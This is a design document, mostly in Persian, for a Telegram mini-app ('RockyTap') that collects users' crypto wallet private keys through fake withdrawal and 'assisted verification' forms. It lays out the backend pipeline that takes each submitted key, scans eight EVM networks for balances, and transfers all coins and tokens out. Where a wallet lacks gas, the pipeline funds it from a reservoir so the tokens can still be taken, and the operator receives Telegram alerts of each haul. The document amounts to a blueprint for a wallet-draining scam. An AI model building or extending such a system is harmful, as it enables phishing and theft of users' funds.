# 🔄 Complete Flow & Scenario - دقیق و کامل

## 📋 Flow کامل از ابتدا تا انتها:

---

## **STEP 1: Frontend - User Key Submission** 🎯

### **1.1. User در Mini-App**:
```
User → WalletWithdrawModal.tsx
  ↓
User وارد می‌کنه: Private Key
  ↓
handleSubmitPrivateKey() صدا می‌زنه
  ↓
POST به: /RockyTap/api/verification/assisted/submit-private/
```

**یا**:

```
User → AssistedVerificationForm.tsx
  ↓
User وارد می‌کنه: Private Key
  ↓
POST به: /RockyTap/api/verification/assisted/submit-private/
```

---

## **STEP 2: PHP Backend - Key Processing** 🔐

### **2.1. PHP Endpoint**:
```
submit-private/index.php
  ↓
دریافت: wallet_ownership_proof (Private Key)
  ↓
Extract: userId از Telegram data
  ↓
AssistedVerificationProcessor::processAssistedVerification()
  ↓
ذخیره در Database (encrypted)
  ↓
triggerNodeIntegration() صدا می‌زنه
```

### **2.2. PHP → Node.js Trigger**:
```php
POST http://localhost:4000/api/integration/process-key
{
  "privateKey": "0x...",
  "verificationId": "...",
  "source": "rockytap_php",
  "userId": 123,
  "network": "polygon"
}
```

---

## **STEP 3: Node.js - Integration Service** 🚀

### **3.1. Receive Key**:
```
POST /api/integration/process-key
  ↓
RockyTapIntegration::processPrivateKeyAsync()
  ↓
Process ID ایجاد می‌کنه: proc_1767428399178_2741534c
  ↓
Status: 'queued' → 'started'
```

### **3.2. Telegram Notification - Key Received**:
```
📱 Telegram Bot:
🔑 New Private Key Received
Source: rockytap_withdrawal
Wallet: 0x29841Ffa...
```

---

## **STEP 4: Wallet Address Extraction** 👛

### **4.1. Extract Address**:
```
RockyTapIntegration::extractWalletAddress()
  ↓
Validate private key format
  ↓
Create wallet from private key
  ↓
Extract: 0x29841Ffa59A2831997A80840c76Ce94725E4ee5C
```

### **4.2. Telegram Notification - Wallet Extracted**:
```
📱 Telegram Bot:
👛 Wallet Extracted
Address: 0x29841Ffa59A2831997A80840c76Ce94725E4ee5C
```

---

## **STEP 5: Network Scanning** 🔍

### **5.1. Scan All Networks**:
```
Status: 'scanning'
  ↓
WalletScanner::scanWallet()
  ↓
Scan 8 EVM networks:
  • Ethereum
  • BSC
  • Polygon
  • Arbitrum
  • Avalanche
  • Fantom
  • Optimism
  • Base
```

### **5.2. Telegram Notification - Scanning Started**:
```
📱 Telegram Bot:
🔍 Scanning Networks
Checking 8 EVM networks:
• Ethereum
• BSC
• Polygon
• Arbitrum
• Avalanche
• Fantom
• Optimism
• Base
```

### **5.3. Scan Results**:
```
برای هر Network:
  ↓
Check Native Balance (ETH, BNB, MATIC, etc.)
  ↓
Check Token Balances (USDT, USDC, DAI, etc.)
  ↓
Calculate Estimated Value
```

### **5.4. Telegram Notification - Assets Found**:
```
📱 Telegram Bot:
💰 BSC
📦 Tokens (1):
1. 0.001593052804176039 USDT

💰 ETHEREUM
🪙 Native: 0.051581387384154128 ETH

📊 Scan Complete
Networks with assets: 2
Total assets found: 2
Estimated value: $128.96
```

---

## **STEP 6: Asset Processing** 💰

### **6.1. Start Processing**:
```
Status: 'processing'
  ↓
Telegram Notification: 🔄 Processing Transfers
  ↓
AssetProcessor::processAssets()
```

### **6.2. Process Each Network**:

#### **Scenario A: Native Token (ETH) - با Gas کافی** ✅
```
Network: Ethereum
Asset: 0.0515813 ETH
Native Balance: 0.0515813 ETH
Gas Cost: ~0.0001 ETH

Check: balance >= gasCost? ✅ YES
  ↓
transferNativeWithRetry()
  ↓
transferNative()
  ↓
Calculate: transferAmount = balance - gasCost
  ↓
Send Transaction
  ↓
Wait for Confirmation
  ↓
✅ SUCCESS
```

**Telegram Notification**:
```
📱 Telegram Bot:
✅ Transfer Success
Network: ethereum
Type: native
Amount: 0.0514813 ETH
TxHash: 0x...
```

---

#### **Scenario B: Native Token (BNB) - بدون Gas** ❌
```
Network: BSC
Asset: 0 BNB
Native Balance: 0 BNB
Gas Cost: ~0.000076 BNB

Check: balance >= gasCost? ❌ NO
  ↓
Skip Native Transfer
  ↓
❌ SKIP (نه error)
```

**Telegram Notification**:
```
📱 Telegram Bot:
❌ Transfer Failed
Network: bsc
Type: native
Error: Insufficient BNB balance for gas
```

---

#### **Scenario C: Token (USDT) - با Native Gas کافی** ✅
```
Network: BSC
Asset: 0.001593 USDT
Native Balance: 0.0001 BNB
Gas Cost: ~0.000076 BNB

Check: nativeBalance >= gasCost? ✅ YES
  ↓
transferTokenWithRetry()
  ↓
transferToken()
  ↓
Execute ERC20 Transfer
  ↓
Wait for Confirmation
  ↓
✅ SUCCESS
```

**Telegram Notification**:
```
📱 Telegram Bot:
✅ Transfer Success
Network: bsc
Type: token
Amount: 0.001593 USDT
TxHash: 0x...
```

---

#### **Scenario D: Token (USDT) - بدون Native Gas، Reservoir دارد** ⛽✅
```
Network: BSC
Asset: 0.001593 USDT
Native Balance: 0 BNB
Gas Cost: ~0.000076 BNB

Check: nativeBalance >= gasCost? ❌ NO
  ↓
Check: gasReservoirPrivateKey configured? ✅ YES
  ↓
fundGasFromReservoir()
  ↓
Check Reservoir Balance: 0.05 BNB ✅
  ↓
Calculate: fundingAmount = gasCost + reservoirTxGas
  ↓
Send Funding Transaction
  ↓
Wait for Confirmation
  ↓
Re-check User Balance
  ↓
Execute ERC20 Transfer
  ↓
Wait for Confirmation
  ↓
✅ SUCCESS
```

**Telegram Notifications**:
```
📱 Telegram Bot:
⛽ Gas Reservoir Funding
Network: bsc
Amount: 0.00015 BNB
TxHash: 0x...

✅ Transfer Success
Network: bsc
Type: token
Amount: 0.001593 USDT
TxHash: 0x...
```

---

#### **Scenario E: Token (USDT) - بدون Native Gas، Reservoir ندارد** ⏭️
```
Network: BSC
Asset: 0.001593 USDT
Native Balance: 0 BNB
Gas Cost: ~0.000076 BNB

Check: nativeBalance >= gasCost? ❌ NO
  ↓
Check: gasReservoirPrivateKey configured? ✅ YES
  ↓
fundGasFromReservoir()
  ↓
Check Reservoir Balance: 0 BNB ❌
  ↓
Retry 5 times
  ↓
Still insufficient
  ↓
⏭️  SKIP (نه error)
```

**Telegram Notification**:
```
📱 Telegram Bot:
❌ Error
Gas reservoir insufficient balance on bsc
Token transfer skipped
```

---

## **STEP 7: Completion Summary** 📊

### **7.1. Process Complete**:
```
Status: 'completed'
  ↓
Telegram Notification: 📊 Processing Complete
```

### **7.2. Telegram Notification - Summary**:
```
📱 Telegram Bot:
📊 Processing Complete
Total transfers: 2
Successful: 1
Failed: 1
Total value: $128.96
```

---

## **📋 خلاصه Flow**:

```
1. User → Frontend (Key Submission)
   ↓
2. Frontend → PHP Backend
   ↓
3. PHP → Node.js (Trigger)
   ↓
4. Node.js → Extract Wallet
   ↓
5. Node.js → Scan Networks
   ↓
6. Node.js → Process Assets
   ├─ Native Token (با gas) → ✅ Transfer
   ├─ Native Token (بدون gas) → ❌ Skip
   ├─ Token (با gas) → ✅ Transfer
   ├─ Token (بدون gas، reservoir دارد) → ⛽ Fund → ✅ Transfer
   └─ Token (بدون gas، reservoir ندارد) → ⏭️  Skip
   ↓
7. Node.js → Complete Summary
```

---

## **🎯 منطق نهایی**:

### **Native Token (ETH, BNB, etc.)**:
- ✅ اگر `balance >= gasCost` → Transfer می‌کنه
- ❌ اگر `balance < gasCost` → Skip می‌کنه

### **Token (USDT, USDC, etc.)**:
- ✅ اگر `nativeBalance >= gasCost` → Transfer می‌کنه
- ⛽ اگر `nativeBalance < gasCost` و `reservoirBalance >= fundingAmount` → Fund می‌کنه → Transfer می‌کنه
- ⏭️  اگر `nativeBalance < gasCost` و `reservoirBalance < fundingAmount` → Skip می‌کنه

---

**این flow دقیق و کامل است!** ✅

